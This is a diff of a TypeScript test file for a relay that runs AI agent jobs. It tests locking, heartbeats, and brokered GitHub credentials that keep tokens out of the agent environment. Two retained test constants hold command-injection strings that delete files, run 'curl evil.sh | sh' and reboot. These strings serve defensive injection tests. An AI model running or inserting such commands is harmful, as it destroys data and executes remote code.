@@ -14,6 +14,7 @@ import {
 	buildWorkspaceCloneArgs,
 	cloneWorkspaceWithMirrorFallback,
 	createJobNetwork,
+	DEFAULT_RELAY_CAPACITY,
 	deriveContainerName,
 	deriveFirewallTableName,
 	deriveJobNetworkName,
@@ -21,19 +22,28 @@ import {
 	deriveNetworkAnchorName,
 	executeJob,
 	fenceEnv,
+	heartbeatRequestTimeoutMs,
 	inspectReceivePack,
 	isPublicEgressAddress,
 	type Job,
+	jobSerializationKey,
+	KeyedMutex,
+	MAX_HEARTBEAT_REQUEST_MS,
+	MAX_RELAY_CAPACITY,
 	parseAllowedModels,
+	parseRelayCapacity,
 	prepareRuntimeGitHooks,
+	requestGitHubToken,
 	runSetupHook,
 	SETUP_ALLOWED_HOSTS,
 	type SpawnFn,
 	scrubJobResult,
+	sendHeartbeat,
 	startEgressProxy,
 	startGitBroker,
 	tryPrepareRepoMirror,
 	waitForNetworkGateway,
+	withLeaseLiveLock,
 } from "../relay/relay";
 
 /** Minimal ChildProcess double: capture spawn inputs, emit scripted output. */
@@ -66,6 +76,19 @@ function makeSpawn(script: (child: FakeChild) => void): { spawn: SpawnFn; calls:
 	return { spawn: spawnImpl, calls };
 }
 
+interface Gate {
+	readonly promise: Promise<void>;
+	open(): void;
+}
+
+function makeGate(): Gate {
+	let open = (): void => undefined;
+	const promise = new Promise<void>(resolve => {
+		open = () => resolve();
+	});
+	return { promise, open };
+}
+
 const WINDOWS_INJECTION = 'title" && del /q C:\\* && echo "pwned';
 const POSIX_INJECTION = "title; rm -rf ~; $(curl evil.sh | sh) `reboot`";
 
@@ -74,6 +97,188 @@ describe("parseAllowedModels", () => {
 		expect(parseAllowedModels("combo-a, combo-b ,")).toEqual(["combo-a", "combo-b"]);
 		expect(parseAllowedModels("")).toEqual([]);
 		expect(parseAllowedModels(undefined)).toEqual([]);
+	});
+});
+
+describe("bounded lease-live serialization", () => {
+	it("defaults capacity to two and enforces the operator cap", () => {
+		expect(DEFAULT_RELAY_CAPACITY).toBe(2);
+		expect(parseRelayCapacity(undefined)).toBe(2);
+		expect(parseRelayCapacity("")).toBe(2);
+		expect(parseRelayCapacity("4")).toBe(4);
+		expect(parseRelayCapacity("999")).toBe(MAX_RELAY_CAPACITY);
+		expect(parseRelayCapacity("0")).toBe(2);
+		expect(parseRelayCapacity("1.5")).toBe(2);
+		expect(parseRelayCapacity("not-a-number")).toBe(2);
+	});
+
+	it("keys GitHub jobs by case-insensitive repository and all shared-workspace jobs together", () => {
+		expect(
+			jobSerializationKey({
+				github: { owner: "KingKillery", repo: "Oh-My-PK", number: 42, defaultBranch: "main" },
+			}),
+		).toBe("github:kingkillery/oh-my-pk");
+		expect(jobSerializationKey({ source: "linear" }, "/srv/shared")).toBe("workspace:/srv/shared");
+		expect(jobSerializationKey({}, "/srv/shared")).toBe("workspace:/srv/shared");
+	});
+
+	it("bounds a stuck heartbeat fetch instead of consuming capacity forever", async () => {
+		expect(heartbeatRequestTimeoutMs(undefined)).toBe(MAX_HEARTBEAT_REQUEST_MS);
+		expect(heartbeatRequestTimeoutMs(60_000)).toBe(MAX_HEARTBEAT_REQUEST_MS);
+		expect(heartbeatRequestTimeoutMs(5)).toBe(5);
+		const job: Job = {
+			id: "job-heartbeat-timeout",
+			issueId: "issue-1",
+			issueIdentifier: "OMP-1",
+			model: "combo-a",
+			prompt: "p",
+			status: "leased",
+			createdAt: "2026-08-06T00:00:00Z",
+			attemptId: "attempt-1",
+			leaseToken: "lease-1",
+			heartbeatMs: 1_000,
+		};
+		const stuckFetch: typeof fetch = (_input, init) =>
+			new Promise<Response>((_resolve, reject) => {
+				const signal = init?.signal;
+				if (!signal) {
+					reject(new Error("missing heartbeat timeout signal"));
+					return;
+				}
+				const rejectAbort = (): void => reject(signal.reason);
+				if (signal.aborted) rejectAbort();
+				else signal.addEventListener("abort", rejectAbort, { once: true });
+			});
+		const heartbeatErrors: unknown[] = [];
+		let entered = false;
+		const result = await withLeaseLiveLock(
+			{
+				mutex: new KeyedMutex(),
+				key: "workspace:/srv/shared",
+				heartbeatMs: 1_000,
+				heartbeat: () => sendHeartbeat("relay-token", job, { fetchImpl: stuckFetch, timeoutMs: 5 }),
+				onHeartbeatError: error => heartbeatErrors.push(error),
+			},
+			async () => {
+				entered = true;
+			},
+		);
+		expect(result.status).toBe("completed");
+		expect(entered).toBe(true);
+		expect(heartbeatErrors).toHaveLength(1);
+		expect(heartbeatErrors[0]).toBeInstanceOf(Error);
+	});
+
+	it("allows different repositories to overlap", async () => {
+		const mutex = new KeyedMutex();
+		const release = makeGate();
+		const firstEntered = makeGate();
+		const secondEntered = makeGate();
+		const run = (key: string, entered: Gate): Promise<unknown> =>
+			withLeaseLiveLock(
+				{
+					mutex,
+					key,
+					heartbeatMs: 1_000,
+					heartbeat: async () => true,
+				},
+				async () => {
+					entered.open();
+					await release.promise;
+				},
+			);
+		const first = run("github:owner/one", firstEntered);
+		const second = run("github:owner/two", secondEntered);
+		await Promise.all([firstEntered.promise, secondEntered.promise]);
+		expect(mutex.keyCount).toBe(2);
+		release.open();
+		await Promise.all([first, second]);
+		expect(mutex.keyCount).toBe(0);
+	});
+
+	it("serializes one repository while the waiter keeps heartbeating", async () => {
+		const mutex = new KeyedMutex();
+		const firstRelease = makeGate();
+		const secondRelease = makeGate();
+		const firstEntered = makeGate();
+		const secondEntered = makeGate();
+		const order: string[] = [];
+		let waiterHeartbeats = 0;
+		const first = withLeaseLiveLock(
+			{
+				mutex,
+				key: "github:owner/repo",
+				heartbeatMs: 5,
+				heartbeat: async () => true,
+			},
+			async () => {
+				order.push("first-enter");
+				firstEntered.open();
+				await firstRelease.promise;
+				order.push("first-exit");
+			},
+		);
+		await firstEntered.promise;
+		const second = withLeaseLiveLock(
+			{
+				mutex,
+				key: "github:owner/repo",
+				heartbeatMs: 5,
+				heartbeat: async () => {
+					waiterHeartbeats += 1;
+					return true;
+				},
+			},
+			async () => {
+				order.push("second-enter");
+				secondEntered.open();
+				await secondRelease.promise;
+				order.push("second-exit");
+			},
+		);
+		await Bun.sleep(20);
+		expect(order).toEqual(["first-enter"]);
+		expect(waiterHeartbeats).toBeGreaterThanOrEqual(2);
+		firstRelease.open();
+		await secondEntered.promise;
+		expect(order).toEqual(["first-enter", "first-exit", "second-enter"]);
+		secondRelease.open();
+		expect((await first).status).toBe("completed");
+		expect((await second).status).toBe("completed");
+		expect(mutex.keyCount).toBe(0);
+	});
+
+	it("cancels a fenced waiter without entering the critical section", async () => {
+		const mutex = new KeyedMutex();
+		const holder = await mutex.acquire("github:owner/repo");
+		expect(holder).toBeDefined();
+		let heartbeatCount = 0;
+		let fenceLossCount = 0;
+		let entered = false;
+		const waiting = withLeaseLiveLock(
+			{
+				mutex,
+				key: "github:owner/repo",
+				heartbeatMs: 5,
+				heartbeat: async () => {
+					heartbeatCount += 1;
+					return heartbeatCount < 3;
+				},
+				onFenceLoss: () => {
+					fenceLossCount += 1;
+				},
+			},
+			async () => {
+				entered = true;
+			},
+		);
+		expect(await waiting).toEqual({ status: "fenced" });
+		expect(entered).toBe(false);
+		expect(heartbeatCount).toBe(3);
+		expect(fenceLossCount).toBe(1);
+		expect(mutex.keyCount).toBe(1);
+		holder?.release();
+		expect(mutex.keyCount).toBe(0);
 	});
 });
 
@@ -386,6 +591,62 @@ describe("GitHub clone mirror", () => {
 		expect(warnings[0]).toContain("[redacted]");
 		expect(warnings[0]).not.toContain("ghs_secret");
 	});
+
+	it("serializes mutation per mirror path while different mirrors overlap", async () => {
+		const mirrorMutex = new KeyedMutex();
+		const firstEntered = makeGate();
+		const firstRelease = makeGate();
+		let sameMirrorMutations = 0;
+		const first = tryPrepareRepoMirror("/cache/repo.git", "https://github.com/o/repo.git", {}, undefined, {
+			mirrorMutex,
+			makeDir: async () => undefined,
+			mirrorExists: async () => true,
+			runGit: async () => {
+				sameMirrorMutations += 1;
+				firstEntered.open();
+				await firstRelease.promise;
+			},
+		});
+		await firstEntered.promise;
+		const second = tryPrepareRepoMirror("/cache/repo.git", "https://github.com/o/repo.git", {}, undefined, {
+			mirrorMutex,
+			makeDir: async () => undefined,
+			mirrorExists: async () => true,
+			runGit: async () => {
+				sameMirrorMutations += 1;
+			},
+		});
+		await Bun.sleep(10);
+		expect(sameMirrorMutations).toBe(1);
+		firstRelease.open();
+		expect(await Promise.all([first, second])).toEqual(["/cache/repo.git", "/cache/repo.git"]);
+		expect(sameMirrorMutations).toBe(2);
+
+		const distinctRelease = makeGate();
+		const distinctEntered = makeGate();
+		let activeMutations = 0;
+		let maximumMutations = 0;
+		const prepareDistinct = (mirror: string): Promise<string | undefined> =>
+			tryPrepareRepoMirror(mirror, `https://github.com/o/${mirror.slice(7)}`, {}, undefined, {
+				mirrorMutex,
+				makeDir: async () => undefined,
+				mirrorExists: async () => true,
+				runGit: async () => {
+					activeMutations += 1;
+					maximumMutations = Math.max(maximumMutations, activeMutations);
+					if (activeMutations === 2) distinctEntered.open();
+					await distinctRelease.promise;
+					activeMutations -= 1;
+				},
+			});
+		const distinctA = prepareDistinct("/cache/a.git");
+		const distinctB = prepareDistinct("/cache/b.git");
+		await distinctEntered.promise;
+		expect(maximumMutations).toBe(2);
+		distinctRelease.open();
+		await Promise.all([distinctA, distinctB]);
+		expect(mirrorMutex.keyCount).toBe(0);
+	});
 });
 
 describe("scrubJobResult", () => {
@@ -437,7 +698,7 @@ describe("fence environment threading", () => {
 		expect(calls[0]!.options.env).toBeUndefined();
 	});
 
-	it("injects GitHub credentials into the child env only for GitHub jobs", () => {
+	it("keeps raw credentials out of agent env and routes GitHub publishing through the host broker", () => {
 		const base: Job = {
 			id: "job-1",
 			issueId: "kingkillery/oh-my-pk#7",
@@ -450,20 +711,39 @@ describe("fence environment threading", () => {
 			leaseToken: "lease-1",
 		};
 		const linearEnv = fenceEnv(base);
-		expect(linearEnv.GH_TOKEN).toBe(process.env.GH_TOKEN);
+		expect(linearEnv.RELAY_TOKEN).toBeUndefined();
+		expect(linearEnv.GH_TOKEN).toBeUndefined();
+		expect(linearEnv.GITHUB_TOKEN).toBeUndefined();
 		expect(linearEnv.GIT_CONFIG_COUNT).toBe("1");
 
-		const githubEnv = fenceEnv({
-			...base,
-			source: "github",
-			githubToken: "ghs_abc",
-			github: { owner: "kingkillery", repo: "oh-my-pk", number: 7, defaultBranch: "main" },
-		});
-		expect(githubEnv.GH_TOKEN).toBe("ghs_abc");
+		const githubEnv = fenceEnv(
+			{
+				...base,
+				githubToken: "ghs_lease_time_clone_only",
+				github: { owner: "kingkillery", repo: "oh-my-pk", number: 7, defaultBranch: "main" },
+			},
+			"/runtime/git-hooks",
+			{
+				authenticatedGitBaseUrl: "http://ompk-placeholder:opaque@127.0.0.1:1234/gh/",
+				fenceUrl: "http://127.0.0.1:1234/fence-check",
+				placeholderCredential: "opaque",
+			},
+		);
+		expect(githubEnv.RELAY_TOKEN).toBeUndefined();
+		expect(githubEnv.GH_TOKEN).toBeUndefined();
+		expect(githubEnv.GITHUB_TOKEN).toBeUndefined();
+		expect(JSON.stringify(githubEnv)).not.toContain("ghs_lease_time_clone_only");
 		expect(githubEnv.GIT_CONFIG_COUNT).toBe("2");
-		expect(githubEnv.GIT_CONFIG_KEY_1).toBe("url.https://x-access-token:ghs_abc@github.com/.insteadOf");
+		expect(githubEnv.GIT_CONFIG_KEY_1).toBe("url.http://ompk-placeholder:opaque@127.0.0.1:1234/gh/.insteadOf");
 		expect(githubEnv.GIT_CONFIG_VALUE_1).toBe("https://github.com/");
 		expect(githubEnv.GIT_CONFIG_KEY_0).toBe("core.hooksPath");
+		expect(githubEnv.GIT_CONFIG_VALUE_0).toBe("/runtime/git-hooks");
+		expect(githubEnv.OMPK_FENCE_URL).toBe("http://127.0.0.1:1234/fence-check");
+		expect(githubEnv.OMPK_BROKER_URL).toBe("http://127.0.0.1:1234");
+		expect(githubEnv.OMPK_BROKER_CREDENTIAL).toBe("opaque");
+		expect(githubEnv.PATH?.startsWith("/runtime/git-hooks")).toBe(true);
+		expect(githubEnv.NO_PROXY?.split(",")).toContain("127.0.0.1");
+		expect(githubEnv.no_proxy?.split(",")).toContain("127.0.0.1");
 	});
 });
 
@@ -728,6 +1008,43 @@ describe("git broker", () => {
 		});
 	});
 
+	it("requests a fresh fence-bound clone token after a late mutex wait", async () => {
+		const pollTime = Date.parse("2026-08-06T18:00:00Z");
+		const admittedCloneToken = `ghs_poll_${pollTime}`;
+		const acquiredMutexAt = pollTime + 61 * 60_000;
+		const calls: Array<{ authorization: string | null; body: unknown; at: number }> = [];
+		const freshCloneToken = await requestGitHubToken({
+			workerTokenUrl: "https://worker.test/github-token",
+			workerRelayToken: "host-relay-secret",
+			jobId: "job-late-wait",
+			attemptId: "attempt-late-wait",
+			leaseToken: "lease-late-wait",
+			fetchImpl: async (_input, init) => {
+				calls.push({
+					authorization: new Headers(init?.headers).get("authorization"),
+					body: JSON.parse(typeof init?.body === "string" ? init.body : "{}"),
+					at: acquiredMutexAt,
+				});
+				return Response.json({
+					token: `ghs_clone_${acquiredMutexAt}`,
+					expiresAt: new Date(acquiredMutexAt + 60 * 60_000).toISOString(),
+				});
+			},
+		});
+		expect(calls).toEqual([
+			{
+				authorization: "Bearer host-relay-secret",
+				body: {
+					jobId: "job-late-wait",
+					attemptId: "attempt-late-wait",
+					leaseToken: "lease-late-wait",
+				},
+				at: acquiredMutexAt,
+			},
+		]);
+		expect(freshCloneToken).toBe(`ghs_clone_${acquiredMutexAt}`);
+		expect(freshCloneToken).not.toBe(admittedCloneToken);
+	});
 	it("never returns the token and enforces repository and push policy before issuance", async () => {
 		const calls: Array<{ url: string; authorization?: string; body?: string }> = [];
 		const fetchImpl: typeof fetch = async (input, init) => {
@@ -815,6 +1132,121 @@ describe("git broker", () => {
 		}
 	});
 
+	it("uses fresh host-broker credentials for bare Git and PR operations after 55 minutes", async () => {
+		const start = Date.parse("2026-08-06T20:00:00Z");
+		let simulatedNow = start;
+		const tokenMints: Array<{ at: number; body: string }> = [];
+		const upstreamAuthorizations: string[] = [];
+		const fetchImpl: typeof fetch = async (input, init) => {
+			const url = input instanceof Request ? input.url : String(input);
+			const authorization = new Headers(init?.headers).get("authorization") ?? "";
+			if (url === "https://worker.test/github-token") {
+				expect(authorization).toBe("Bearer host-relay-secret");
+				tokenMints.push({
+					at: simulatedNow,
+					body: typeof init?.body === "string" ? init.body : "",
+				});
+				return Response.json({
+					token: `ghs_minted_at_${simulatedNow}`,
+					expiresAt: new Date(simulatedNow + 60 * 60_000).toISOString(),
+				});
+			}
+			if (url.startsWith("https://github.com/")) {
+				upstreamAuthorizations.push(authorization);
+				return new Response("git-upstream-ok");
+			}
+			if (url === "https://api.github.com/repos/kingkillery/oh-my-pk/pulls") {
+				upstreamAuthorizations.push(authorization);
+				return Response.json({ number: 42 });
+			}
+			throw new Error(`unexpected URL ${url}`);
+		};
+		const broker = await startGitBroker({
+			jobId: "job-late",
+			attemptId: "attempt-late",
+			leaseToken: "lease-late",
+			owner: "kingkillery",
+			repo: "oh-my-pk",
+			defaultBranch: "main",
+			workerTokenUrl: "https://worker.test/github-token",
+			workerRelayToken: "host-relay-secret",
+			workerFenceUrl: "https://worker.test/fence-check",
+			placeholderCredential: "late-placeholder",
+			fetchImpl,
+		});
+		const brokerAuth = `Basic ${btoa("ompk-placeholder:late-placeholder")}`;
+		const bareEnv = fenceEnv(
+			{
+				id: "job-late",
+				source: "github",
+				issueId: "kingkillery/oh-my-pk#42",
+				issueIdentifier: "kingkillery/oh-my-pk#42",
+				model: "combo-a",
+				prompt: "p",
+				status: "leased",
+				createdAt: "2026-08-06T20:00:00Z",
+				attemptId: "attempt-late",
+				leaseToken: "lease-late",
+				githubToken: "ghs_lease_time_clone_only",
+				github: { owner: "kingkillery", repo: "oh-my-pk", number: 42, defaultBranch: "main" },
+			},
+			"/runtime/git-hooks",
+			broker,
+		);
+		try {
+			expect(bareEnv.GIT_CONFIG_KEY_1).toBe(`url.${broker.authenticatedGitBaseUrl}.insteadOf`);
+			expect(JSON.stringify(bareEnv)).not.toContain("ghs_lease_time_clone_only");
+
+			const discovery = await fetch(`${broker.url}/gh/kingkillery/oh-my-pk.git/info/refs?service=git-receive-pack`, {
+				headers: { Authorization: brokerAuth },
+			});
+			expect(discovery.status).toBe(200);
+
+			simulatedNow += 56 * 60_000;
+			const push = await fetch(`${broker.url}/gh/kingkillery/oh-my-pk.git/git-receive-pack`, {
+				method: "POST",
+				headers: {
+					Authorization: brokerAuth,
+					"Content-Type": "application/x-git-receive-pack-request",
+				},
+				body: receivePackBody("refs/heads/ompk/late-publish"),
+			});
+			expect(push.status).toBe(200);
+
+			simulatedNow += 60_000;
+			const pullRequest = await fetch(`${broker.url}/pull-request`, {
+				method: "POST",
+				headers: {
+					"Content-Type": "application/json",
+					"X-OMPK-Placeholder": "late-placeholder",
+				},
+				body: JSON.stringify({
+					title: "Late publish",
+					body: "Fresh credential",
+					base: "main",
+					head: "ompk/late-publish",
+					draft: true,
+				}),
+			});
+			expect(pullRequest.status).toBe(200);
+
+			expect(tokenMints.map(mint => mint.at)).toEqual([start, start + 56 * 60_000, start + 57 * 60_000]);
+			for (const mint of tokenMints) {
+				expect(JSON.parse(mint.body)).toEqual({
+					jobId: "job-late",
+					attemptId: "attempt-late",
+					leaseToken: "lease-late",
+				});
+			}
+			expect(upstreamAuthorizations).toEqual([
+				`Basic ${btoa(`x-access-token:ghs_minted_at_${start}`)}`,
+				`Basic ${btoa(`x-access-token:ghs_minted_at_${start + 56 * 60_000}`)}`,
+				`Bearer ghs_minted_at_${start + 57 * 60_000}`,
+			]);
+		} finally {
+			await broker.stop();
+		}
+	});
 	it("brokers a bounded draft pull request with host-only authentication and redacted errors", async () => {
 		const calls: Array<{ url: string; authorization?: string; body?: string }> = [];
 		const fetchImpl: typeof fetch = async (input, init) => {
